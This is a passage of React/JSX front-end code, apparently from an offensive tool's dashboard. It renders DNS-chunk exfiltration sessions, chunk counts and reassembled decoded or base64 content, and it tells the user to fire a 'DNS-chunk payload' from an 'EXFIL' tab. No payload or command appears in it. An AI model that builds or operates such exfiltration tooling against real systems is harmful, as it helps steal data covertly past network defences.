                      <div className="text-[10px] text-zinc-600">{s.received} of {s.total} chunks received ({pct}%)</div>
                    </div>
                  )}
                  {s.complete&&(
                    <div className="flex-1 min-h-0 overflow-auto border border-zinc-900 bg-zinc-950 p-2">
                      {s.decoded
                        ? <pre className="text-green-400 text-[10px] whitespace-pre-wrap break-all">{s.decoded}</pre>
                        : (
                          <div>
                            <div className="text-zinc-600 text-[10px] mb-2">Binary — base64:</div>
                            <pre className="text-cyan-400 text-[10px] whitespace-pre-wrap break-all">{s.assembled?.slice(0,4096)}</pre>
                          </div>
                        )
                      }
                    </div>
                  )}
                </div>
              );
            })()}
            {!expandedDns&&(
              <div className="flex-1 flex flex-col items-center justify-center gap-3 text-zinc-700">
                <div className="text-[11px]">Select a session to view reassembled content</div>
                <div className="text-[10px] text-zinc-800 max-w-xs text-center">
                  Fire an HTTP DNS-chunk payload from the EXFIL tab to start a session. Chunks are reassembled server-side in real-time.
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
